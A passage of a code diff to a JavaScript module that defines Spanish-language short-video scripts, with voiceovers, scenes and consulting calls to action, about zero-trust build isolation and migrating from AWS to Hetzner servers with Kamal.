+          visual_cue: 'Visualizador del kernel impidiendo conexiones salientes no autorizadas',
           props: {
-            header: 'AUDITORÍA DE CIBERSEGURIDAD',
-            title: 'ZERO-TRUST EN TUS PIPELINES DE DESPLIEGUE',
-            cta: {
-              badge: 'AUDITORÍA DE SEGURIDAD (Link en perfil)',
-              text: 'Protege tus credenciales y entorno productivo. Link directo en mi perfil.'
-            }
+            badge: 'ZERO-TRUST NETWORKING',
+            title: 'AISLAMIENTO DE PROCESO DE BUILD',
+            subtitle: 'BLOQUEO DE CONEXIONES EXTERNAS NO PERMITIDAS'
           }
         }
       ]
@@ -493,122 +398,83 @@ module.exports = [
   },
 
   // ----------------------------------------------------
-  // TEMA 10: ÉXODO BARE-METAL KAMAL
+  // TEMA 10: KAMAL EN PRODUCCIÓN (DE $15.000 A $200)
   // ----------------------------------------------------
   {
     slug: '10_exodo_bare_metal_kamal',
-    category: 'INFRAESTRUCTURA & CLOUD COSTS',
-    ctaType: 'cloud_costs',
+    category: 'DEVOPS & CLOUD',
+    ctaType: 'optimizacion_cloud',
     varA: {
       title: 'Kamal en Producción: Despliegue Zero-Downtime sin Kubernetes',
-      tone: 'Ingeniería práctica de operaciones, simplicidad en servidores dedicados',
+      tone: 'Pragmático, orientado a costes, alta disponibilidad',
       scenes: [
         {
-          id: 'kamal_flow_hook',
-          type: 'architecture_flow',
+          id: 'kamal_stepper_hook',
+          type: 'migration_stepper_viz',
           duration: 6.5,
-          voiceover: '¿Cómo desplegar con cero tiempo de inactividad sin la pesadilla de Kubernetes? Kamal levanta el nuevo contenedor, valida la salud y conmuta el tráfico en milisegundos.',
-          visual_cue: 'Apertura directa con arquitectura de conmutación de tráfico con proxy',
+          voiceover: 'No necesitas un clúster de Kubernetes de tres mil dólares para tener despliegues con cero tiempo de inactividad. Kamal lo hace con Docker en servidores económicos.',
+          visual_cue: 'Visualizador de fases de despliegue rolling zero-downtime con Kamal y Traefik',
           props: {
-            header: 'MECANISMO DE DESPLIEGUE',
-            title: 'ROLLING RESTART CON TRAEFIK',
-            nodes: [
-              { id: 'proxy', label: 'TRAEFIK PROXY REVERSE', sublabel: 'Manejo automático de certificados SSL y rutas', color: '#38bdf8', y: 160 },
-              { id: 'app_new', label: 'NUEVO CONTENEDOR (V2)', sublabel: 'Health check verificado en localhost:8001', color: '#10b981', y: 520 },
-              { id: 'app_old', label: 'CONTENEDOR ANTIGUO (V1)', sublabel: 'Drenado suave de conexiones activas', color: '#71717a', y: 880 }
-            ]
+            badge: 'DESPLIEGUE ZERO-DOWNTIME',
+            title: 'KAMAL ROLLING DEPLOY',
+            subtitle: 'TRANSICIÓN DE CONTENEDORES SIN PERDER PETICIONES'
           }
         },
         {
-          id: 'kamal_deploy',
-          type: 'code_terminal',
-          duration: 6.0,
-          voiceover: 'Todo se configura en un simple archivo YAML. Un comando en tu terminal y tu aplicación queda en producción en tus propios servidores.',
-          visual_cue: 'Terminal ejecutando kamal deploy con salida de docker tags',
+          id: 'metrics_cost_kamal',
+          type: 'metrics_comparison',
+          duration: 5.5,
+          voiceover: 'Mudas tu infraestructura de AWS a servidores Hetzner de alto rendimiento y pasas de pagar miles de dólares al mes a menos de doscientos.',
+          visual_cue: 'Comparativa de costos: Clúster EKS de AWS vs Servidor Hetzner con Kamal',
           props: {
-            header: 'CONFIGURACIÓN DECLARATIVA',
-            title: 'DEPLOY CON UN SOLO COMANDO',
-            filename: 'config/deploy.yml',
-            codeLines: [
-              'service: api-core',
-              'image: registry.gitlab.com/app/api',
-              'servers:',
-              '  web:',
-              '    - 159.69.10.42 # Servidor Hetzner $40/mo',
-              'kamal deploy # Completado en 24 segundos con 0s downtime'
-            ],
-            cursorLine: 5
+            header: 'AHORRO EN INFRAESTRUCTURA CLOUD',
+            metricA: { label: 'AWS EKS + NAT GATEWAYS', value: '$4.850 / mes', sub: 'Control plane · Load Balancers · Tráfico', color: '#ef4444' },
+            metricB: { label: 'HETZNER DEDICADO + KAMAL', value: '$180 / mes', sub: '64 núcleos AMD · 128 GB RAM · NVMe', color: '#10b981' }
           }
         },
         {
           id: 'cta_kamal',
-          type: 'tradeoff_matrix',
-          duration: 5.0,
-          voiceover: 'Si tu empresa quema dinero en AWS y quieres migrar a una infraestructura simple en servidores dedicados, te asesoro en el proceso. Link en mi perfil.',
-          visual_cue: 'Cierre con auditoría y migración cloud',
+          type: 'terminal_split',
+          duration: 5.5,
+          voiceover: 'Ayudo a startups a migrar de la nube inflada a servidores dedicados con Kamal sin perder disponibilidad. Enlace en mi perfil para auditar tus servidores.',
+          visual_cue: 'Terminal ejecutando kamal deploy con éxito y llamada a la acción en bio',
           props: {
-            header: 'MIGRACIÓN & AUDITORÍA CLOUD',
-            title: 'REDUCE FACTURA HASTA UN 80%',
-            cta: {
-              badge: 'AUDITORÍA CLOUD (Link en bio)',
-              text: '¿Facturas absurdas en AWS o GCP? Agenda una sesión de migración en mi perfil.'
-            }
+            header: 'MIGRACIÓN CLOUD (Link en bio)',
+            title: 'DESPLIEGUE SENCILLO Y RENTABLE',
+            leftTitle: 'KAMAL DEPLOY EN ACCIÓN',
+            rightTitle: 'RESULTADO DE MIGRACIÓN',
+            leftText: '$ kamal deploy\n✔ Subiendo imagen Docker a servidor...\n✔ Iniciando nuevo contenedor en puerto 3001\n✔ Traefik redirige el tráfico (0s downtime)\n✔ Deteniendo contenedor antiguo',
+            rightText: '• Reduce el 90% de tu factura mensual\n• Control total sobre tu hardware\n• Cero dolores de cabeza con K8s\n• ¿Evaluamos tu caso? Enlace en perfil'
           }
         }
       ]
     },
     varB: {
       title: 'De $15.000 a $200 al mes: El éxodo de la nube a servidores Hetzner',
-      tone: 'Financiero demoledor, destapando el negocio abusivo de la nube pública',
+      tone: 'Provocador, financiero, orientado a rentabilidad real',
       scenes: [
         {
-          id: 'hetzner_split_hook',
-          type: 'terminal_split',
-          duration: 6.5,
-          voiceover: 'Empresas como 37signals abandonaron la nube pública y pasaron de pagar cientos de miles de dólares a una fracción en servidores dedicados.',
-          visual_cue: 'Apertura directa con terminal comparando factura mensual de AWS frente a servidor dedicado',
+          id: 'exodus_metrics',
+          type: 'metrics_comparison',
+          duration: 6.0,
+          voiceover: 'Las grandes nubes te cobran por cada gigabyte transferido y cada balanceador levantado. Con un servidor dedicado en Hetzner obtienes diez veces más potencia por una fracción del precio.',
+          visual_cue: 'Métricas de ahorro masivo de infraestructura',
           props: {
-            header: 'COMPARATIVA DE HARDWARE Y COSTES',
-            title: 'VIRTUALIZACIÓN AWS VS SERVIDOR FÍSICO HETZNER',
-            termA: {
-              title: 'AWS CLOUD (EKS + RDS + NAT)',
-              color: '#ef4444',
-              cmd: 'aws billing get-monthly-forecast',
-              status: 'Facturación por cada gigabyte transferido',
-              time: '$14,800/mes',
-              lines: [
-                'CPU compartida con vecinos ruidosos',
-                'Coste por transferencia de datos: $0.09 por GB',
-                'Complejidad: 40 servicios conectados en consola'
-              ]
-            },
-            termB: {
-              title: 'HETZNER DEDICATED SERVER',
-              color: '#10b981',
-              cmd: 'lscpu && free -h',
-              status: 'AMD EPYC 32 Cores · 128GB DDR5 RAM · 2x 2TB NVMe',
-              time: '$190/mes',
-              lines: [
-                '100% de la CPU física dedicada a tu app',
-                'Tráfico ilimitado a 1 Gbps incluido',
-                'Despliegues sencillos con Docker y Kamal'
-              ]
-            }
+            header: 'EL ÉXODO DE LA NUBE EN 2026',
+            metricA: { label: 'FACTURA TÍPICA AWS', value: '$14.800', sub: 'Servicios inflados y tráfico de red', color: '#ef4444' },
+            metricB: { label: 'HETZNER BARE METAL', value: '$220', sub: 'Tráfico ilimitado · Hardware dedicado', color: '#10b981' }
           }
         },
         {
-          id: 'cta_kamal_b',
-          type: 'tradeoff_matrix',
-          duration: 5.0,
-          voiceover: 'Diseño planes de migración a bare-metal para recortar costes y multiplicar la velocidad de tu backend. Hablemos en el enlace de mi perfil.',
-          visual_cue: 'Cierre con auditoría de infraestructura',
+          id: 'kamal_rollout',
+          type: 'migration_stepper_viz',
+          duration: 5.5,
+          voiceover: 'Con herramientas como Kamal despliegas con un solo comando desde tu terminal manteniendo cero caídas en producción. Link en bio para auditar tu nube.',
+          visual_cue: 'Visualizador del flujo de despliegue en servidor bare metal',
           props: {
-            header: 'PLAN DE MIGRACIÓN BARE-METAL',
-            title: 'AHORRA MILES DE DÓLARES EN INFRAESTRUCTURA',
-            cta: {
-              badge: 'AUDITORÍA DE COSTES (Link en perfil)',
-              text: '¿Listo para salir de la trampa de costes de la nube? Link en mi perfil para agendar tu plan.'
-            }
+            badge: 'SIMPLICIDAD OPERATIVA',
+            title: 'BARE METAL EN PRODUCCIÓN',
+            subtitle: 'DOCKER + TRAEFIK ORQUESTADO POR KAMAL'
           }
         }
       ]
